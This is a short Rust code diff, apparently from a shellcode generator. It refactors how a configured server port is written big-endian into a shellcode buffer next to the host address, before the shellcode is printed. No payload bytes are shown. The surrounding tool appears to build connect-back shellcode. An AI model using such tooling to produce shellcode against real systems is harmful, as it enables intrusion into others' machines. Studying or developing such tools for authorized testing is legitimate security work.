@@ -150,8 +150,10 @@ fn run(config: &mut Config) -> Result<(), Box<dyn Error>> {
     for i in 0..4 {
         read_shellcode[read_receiver.host_index + i] = host_octets[i];
     }
-    read_shellcode[read_receiver.port_index] = ((config.server_port & 0xff00) >> 8) as u8;
-    read_shellcode[read_receiver.port_index + 1] = (config.server_port & 0xff) as u8;
+    let server_port_bytes = config.server_port.to_be_bytes();
+    for i in 0..2 {
+        read_shellcode[read_receiver.port_index + i] = server_port_bytes[i];
+    }
 
     match config.sc_fmt {
         ScFmt::ScFmtQuoted => print_shellcode_quoted(&read_shellcode),
